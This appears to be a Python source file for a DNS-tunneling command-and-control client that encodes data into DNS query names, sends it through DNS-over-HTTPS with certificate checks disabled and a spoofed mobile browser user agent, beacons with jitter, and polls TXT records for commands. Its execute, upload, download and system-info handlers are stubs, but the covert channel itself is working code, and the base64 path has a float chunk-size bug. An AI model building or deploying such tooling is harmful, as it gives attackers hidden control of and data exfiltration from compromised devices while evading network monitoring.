
"""
DNS Covert Channel C2 Profile
Implements DNS tunneling with base32 encoding, chunked data transfer,
and DNS-over-HTTPS support for covert communications.
"""

import asyncio
import base64
import json
import logging
import random
import time
import uuid
import zlib
from typing import Dict, List, Optional, Any, Tuple, Union
from dataclasses import dataclass, field
from enum import Enum
import hashlib
import struct


try:
    import dns.resolver
    import dns.query
    import dns.message
    import dns.rrset
    import dns.rdatatype
    import dns.name
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    logging.warning("dnspython not available. Install with: pip install dnspython")


import aiohttp
import ssl


class DNSRecordType(Enum):
    A = 1
    TXT = 16
    CNAME = 5
    MX = 15
    NULL = 10


class DNSChannel(Enum):
    UDP = "udp"
    TCP = "tcp"
    HTTPS = "https"
    TLS = "tls"


class DataEncoding(Enum):
    BASE32 = "base32"
    BASE64 = "base64"
    HEX = "hex"
    BINARY = "binary"


@dataclass
class DNSPacket:
    packet_id: str
    sequence: int
    total_chunks: int
    data: bytes
    record_type: DNSRecordType
    encoding: DataEncoding
    timestamp: float
    checksum: str = field(init=False)
    
    def __post_init__(self):
        self.checksum = hashlib.md5(self.data).hexdigest()[:8]


class DNSEncoder:
    """Handles encoding/decoding of data for DNS tunneling"""
    
    MAX_LABEL_LENGTH = 63
    MAX_DOMAIN_LENGTH = 253
    
    @staticmethod
    def encode_data(data: bytes, encoding: DataEncoding) -> str:
        """Encode binary data for DNS transmission"""
        if encoding == DataEncoding.BASE32:

            encoded = base64.b32encode(data).decode().rstrip('=').lower()
            return encoded.replace('=', '')
        elif encoding == DataEncoding.BASE64:

            encoded = base64.urlsafe_b64encode(data).decode().rstrip('=')
            return encoded.replace('_', '').replace('-', '')
        elif encoding == DataEncoding.HEX:
            return data.hex()
        else:
            raise ValueError(f"Unsupported encoding: {encoding}")
    
    @staticmethod
    def decode_data(encoded: str, encoding: DataEncoding) -> bytes:
        """Decode DNS-transmitted data back to binary"""
        try:
            if encoding == DataEncoding.BASE32:

                padding = 8 - (len(encoded) % 8)
                if padding != 8:
                    encoded += '=' * padding
                return base64.b32decode(encoded.upper())
            elif encoding == DataEncoding.BASE64:

                padding = 4 - (len(encoded) % 4)
                if padding != 4:
                    encoded += '=' * padding
                return base64.urlsafe_b64decode(encoded)
            elif encoding == DataEncoding.HEX:
                return bytes.fromhex(encoded)
            else:
                raise ValueError(f"Unsupported encoding: {encoding}")
        except Exception as e:
            logging.error(f"Failed to decode data: {e}")
            return b''
    
    @staticmethod
    def create_dns_query_name(encoded_data: str, domain: str, packet_info: Dict) -> str:
        """Create a DNS query name embedding the encoded data"""

        labels = []
        

        labels.append(packet_info.get('packet_id', '0')[:8])
        labels.append(f"{packet_info.get('sequence', 0):02x}")
        labels.append(f"{packet_info.get('total_chunks', 1):02x}")
        

        data_labels = DNSEncoder._split_to_labels(encoded_data)
        labels.extend(data_labels)
        

        query_name = '.'.join(labels + [domain])
        

        if len(query_name) > DNSEncoder.MAX_DOMAIN_LENGTH:

            query_name = query_name[:DNSEncoder.MAX_DOMAIN_LENGTH]
        
        return query_name
    
    @staticmethod
    def _split_to_labels(data: str) -> List[str]:
        """Split data string into DNS label-sized chunks"""
        labels = []
        for i in range(0, len(data), DNSEncoder.MAX_LABEL_LENGTH):
            labels.append(data[i:i+DNSEncoder.MAX_LABEL_LENGTH])
        return labels
    
    @staticmethod
    def parse_dns_query_name(query_name: str, domain: str) -> Tuple[str, Dict]:
        """Parse encoded data and metadata from DNS query name"""
        try:

            if query_name.endswith('.' + domain):
                query_name = query_name[:-len('.' + domain)]
            elif query_name.endswith(domain):
                query_name = query_name[:-len(domain)]
            
            labels = query_name.split('.')
            
            if len(labels) < 3:
                return '', {}
            

            packet_id = labels[0]
            sequence = int(labels[1], 16)
            total_chunks = int(labels[2], 16)
            

            data_labels = labels[3:]
            encoded_data = ''.join(data_labels)
            
            metadata = {
                'packet_id': packet_id,
                'sequence': sequence,
                'total_chunks': total_chunks
            }
            
            return encoded_data, metadata
            
        except Exception as e:
            logging.error(f"Failed to parse DNS query name: {e}")
            return '', {}


class DNSChunker:
    """Handles chunking of large data for DNS transmission"""
    
    def __init__(self, max_chunk_size: int = 200):
        self.max_chunk_size = max_chunk_size
    
    def chunk_data(self, data: bytes, encoding: DataEncoding) -> List[DNSPacket]:
        """Split data into DNS-transmittable chunks"""

        compressed_data = zlib.compress(data)
        

        encoding_overhead = self._get_encoding_overhead(encoding)
        effective_chunk_size = self.max_chunk_size // encoding_overhead
        
        chunks = []
        packet_id = str(uuid.uuid4())[:8]
        
        for i in range(0, len(compressed_data), effective_chunk_size):
            chunk_data = compressed_data[i:i+effective_chunk_size]
            
            packet = DNSPacket(
                packet_id=packet_id,
                sequence=len(chunks),
                total_chunks=0,
                data=chunk_data,
                record_type=DNSRecordType.TXT,
                encoding=encoding,
                timestamp=time.time()
            )
            chunks.append(packet)
        

        for chunk in chunks:
            chunk.total_chunks = len(chunks)
        
        return chunks
    
    def reassemble_chunks(self, packets: List[DNSPacket]) -> Optional[bytes]:
        """Reassemble chunked data packets"""
        try:

            packets.sort(key=lambda p: p.sequence)
            

            if not packets or len(packets) != packets[0].total_chunks:
                logging.warning("Missing chunks for reassembly")
                return None
            

            packet_id = packets[0].packet_id
            for packet in packets:
                if packet.packet_id != packet_id:
                    logging.error("Mismatched packet IDs during reassembly")
                    return None
            

            compressed_data = b''.join(packet.data for packet in packets)
            

            return zlib.decompress(compressed_data)
            
        except Exception as e:
            logging.error(f"Failed to reassemble chunks: {e}")
            return None
    
    def _get_encoding_overhead(self, encoding: DataEncoding) -> int:
        """Get encoding overhead multiplier"""
        if encoding == DataEncoding.BASE32:
            return 2
        elif encoding == DataEncoding.BASE64:
            return 1.5
        elif encoding == DataEncoding.HEX:
            return 3
        else:
            return 2


class DNSOverHTTPS:
    """DNS-over-HTTPS client for covert communications"""
    
    PROVIDERS = {
        'cloudflare': 'https://1.1.1.1/dns-query',
        'google': 'https://dns.google/dns-query',
        'quad9': 'https://dns.quad9.net/dns-query',
        'opendns': 'https://doh.opendns.com/dns-query'
    }
    
    def __init__(self, provider: str = 'cloudflare'):
        self.base_url = self.PROVIDERS.get(provider, self.PROVIDERS['cloudflare'])
        self.session = None
        
    async def _get_session(self) -> aiohttp.ClientSession:
        """Get or create HTTP session"""
        if not self.session:

            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            connector = aiohttp.TCPConnector(ssl=ssl_context, limit=10)
            timeout = aiohttp.ClientTimeout(total=30)
            

            headers = {
                'User-Agent': 'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/118.0',
                'Accept': 'application/dns-message',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive'
            }
            
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers=headers
            )
        
        return self.session
    
    async def query(self, domain: str, record_type: DNSRecordType) -> Optional[Dict]:
        """Perform DNS-over-HTTPS query"""
        try:
            session = await self._get_session()
            

            params = {
                'name': domain,
                'type': record_type.value,
                'do': '1',
                'cd': '0'
            }
            
            async with session.get(self.base_url, params=params) as response:
                if response.status == 200:
                    return await response.json()
                else:
                    logging.error(f"DNS-over-HTTPS query failed: {response.status}")
                    return None
                    
        except Exception as e:
            logging.error(f"DNS-over-HTTPS query error: {e}")
            return None
    
    async def close(self):
        """Close HTTP session"""
        if self.session:
            await self.session.close()
            self.session = None


class DNSTunnelClient:
    """DNS Tunnel C2 Client"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.domain = config.get('domain', 'example.com')
        self.agent_id = config.get('agent_id', str(uuid.uuid4()))
        self.encoding = DataEncoding(config.get('encoding', 'base32'))
        self.channel = DNSChannel(config.get('channel', 'https'))
        

        self.encoder = DNSEncoder()
        self.chunker = DNSChunker(config.get('chunk_size', 200))
        self.doh_client = DNSOverHTTPS(config.get('doh_provider', 'cloudflare'))
        

        self.running = False
        self.pending_packets: Dict[str, List[DNSPacket]] = {}
        self.command_handlers: Dict[str, callable] = {}
        

        if DNS_AVAILABLE:
            self.resolver = dns.resolver.Resolver()
            self._configure_dns_resolver()
        
        self._setup_command_handlers()
    
    def _configure_dns_resolver(self):
        """Configure DNS resolver settings"""

        self.resolver.nameservers = [
            '1.1.1.1',
            '8.8.8.8',
            '9.9.9.9',
        ]
        self.resolver.timeout = 10
        self.resolver.lifetime = 30
    
    def _setup_command_handlers(self):
        """Setup command handlers"""
        self.command_handlers.update({
            'ping': self._handle_ping,
            'execute': self._handle_execute,
            'upload': self._handle_upload,
            'download': self._handle_download,
            'system_info': self._handle_system_info
        })
    
    async def start(self):
        """Start DNS tunnel client"""
        if self.running:
            return
        
        self.running = True
        logging.info(f"Starting DNS Tunnel C2 Client (Agent: {self.agent_id})")
        logging.info(f"Domain: {self.domain}, Channel: {self.channel.value}, Encoding: {self.encoding.value}")
        

        asyncio.create_task(self._communication_loop())
    
    async def stop(self):
        """Stop DNS tunnel client"""
        self.running = False
        await self.doh_client.close()
        logging.info("DNS Tunnel C2 Client stopped")
    
    async def _communication_loop(self):
        """Main communication loop"""
        poll_interval = self.config.get('poll_interval', 60)
        
        while self.running:
            try:

                await self._send_beacon()
                

                await self._check_for_commands()
                

                jitter = random.randint(5, 15)
                await asyncio.sleep(poll_interval + jitter)
                
            except Exception as e:
                logging.error(f"Communication loop error: {e}")
                await asyncio.sleep(30)
    
    async def _send_beacon(self):
        """Send beacon message to C2"""
        try:
            beacon_data = {
                'agent_id': self.agent_id,
                'timestamp': time.time(),
                'status': 'active'
            }
            
            await self._send_data('beacon', beacon_data)
            logging.debug("Beacon sent")
            
        except Exception as e:
            logging.error(f"Failed to send beacon: {e}")
    
    async def _check_for_commands(self):
        """Check for incoming commands"""
        try:

            command_domain = f"cmd.{self.agent_id[:8]}.{self.domain}"
            result = await self._dns_query(command_domain, DNSRecordType.TXT)
            
            if result and 'Answer' in result:
                for answer in result['Answer']:
                    if answer.get('type') == DNSRecordType.TXT.value:

                        txt_data = answer.get('data', '')
                        await self._process_command_data(txt_data)
            
        except Exception as e:
            logging.error(f"Failed to check for commands: {e}")
    
    async def _process_command_data(self, encoded_data: str):
        """Process received command data"""
        try:

            decoded_data = self.encoder.decode_data(encoded_data, self.encoding)
            
            if not decoded_data:
                return
            

            command_data = json.loads(decoded_data.decode())
            command = command_data.get('command')
            payload = command_data.get('payload', {})
            

            if command in self.command_handlers:
                result = await self.command_handlers[command](payload)
                

                await self._send_data('result', {
                    'command': command,
                    'result': result,
                    'timestamp': time.time()
                })
            
        except Exception as e:
            logging.error(f"Failed to process command data: {e}")
    
    async def _send_data(self, data_type: str, data: Dict[str, Any]):
        """Send data via DNS tunnel"""
        try:

            json_data = json.dumps(data).encode()
            

            packets = self.chunker.chunk_data(json_data, self.encoding)
            

            for packet in packets:
                await self._send_packet(packet, data_type)
                

                await asyncio.sleep(random.uniform(1, 3))
            
        except Exception as e:
            logging.error(f"Failed to send data: {e}")
    
    async def _send_packet(self, packet: DNSPacket, data_type: str):
        """Send individual packet via DNS"""
        try:

            encoded_data = self.encoder.encode_data(packet.data, packet.encoding)
            

            packet_info = {
                'packet_id': packet.packet_id,
                'sequence': packet.sequence,
                'total_chunks': packet.total_chunks
            }
            

            subdomain = f"{data_type}.{self.agent_id[:8]}"
            query_domain = self.encoder.create_dns_query_name(
                encoded_data,
                f"{subdomain}.{self.domain}",
                packet_info
            )
            

            await self._dns_query(query_domain, packet.record_type)
            
        except Exception as e:
            logging.error(f"Failed to send packet: {e}")
    
    async def _dns_query(self, domain: str, record_type: DNSRecordType) -> Optional[Dict]:
        """Perform DNS query via configured channel"""
        try:
            if self.channel == DNSChannel.HTTPS:
                return await self.doh_client.query(domain, record_type)
            elif DNS_AVAILABLE and self.channel in [DNSChannel.UDP, DNSChannel.TCP]:

                return await self._direct_dns_query(domain, record_type)
            else:
                logging.error(f"DNS channel {self.channel.value} not supported")
                return None
                
        except Exception as e:
            logging.error(f"DNS query failed for {domain}: {e}")
            return None
    
    async def _direct_dns_query(self, domain: str, record_type: DNSRecordType) -> Optional[Dict]:
        """Direct DNS query using dnspython"""
        if not DNS_AVAILABLE:
            return None
            
        try:

            rdtype = getattr(dns.rdatatype, record_type.name)
            

            response = await asyncio.to_thread(
                self.resolver.resolve,
                domain,
                rdtype
            )
            

            result = {
                'Status': 0,
                'Answer': []
            }
            
            for rr in response:
                result['Answer'].append({
                    'name': domain,
                    'type': record_type.value,
                    'data': str(rr)
                })
            
            return result
            
        except Exception as e:
            logging.error(f"Direct DNS query failed: {e}")
            return None
    

    async def _handle_ping(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Handle ping command"""
        return {
            'status': 'alive',
            'agent_id': self.agent_id,
            'timestamp': time.time()
        }
    
    async def _handle_execute(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Handle command execution"""

        return {
            'output': 'Command executed via DNS tunnel',
            'exit_code': 0
        }
    
    async def _handle_upload(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file upload"""
        return {
            'status': 'uploaded',
            'filename': payload.get('filename', 'unknown'),
            'size': 0
        }
    
    async def _handle_download(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file download"""
        return {
            'status': 'downloaded',
            'filename': payload.get('filename', 'unknown'),
            'data': 'base64encodeddata'
        }
    
    async def _handle_system_info(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Handle system info gathering"""
        return {
            'os': 'Android',
            'version': 'Unknown',
            'device': 'Unknown',
            'dns_tunnel': True
        }



async def main():
    """Main function for testing DNS tunnel"""
    logging.basicConfig(level=logging.INFO)
    
    config = {
        'domain': 'c2tunnel.example.com',
        'agent_id': str(uuid.uuid4()),
        'encoding': 'base32',
        'channel': 'https',
        'doh_provider': 'cloudflare',
        'chunk_size': 180,
        'poll_interval': 45
    }
    
    client = DNSTunnelClient(config)
    
    try:
        await client.start()
        logging.info("DNS Tunnel C2 Client started successfully")
        

        await asyncio.Event().wait()
        
    except KeyboardInterrupt:
        logging.info("Shutting down...")
    finally:
        await client.stop()


if __name__ == "__main__":
    asyncio.run(main())
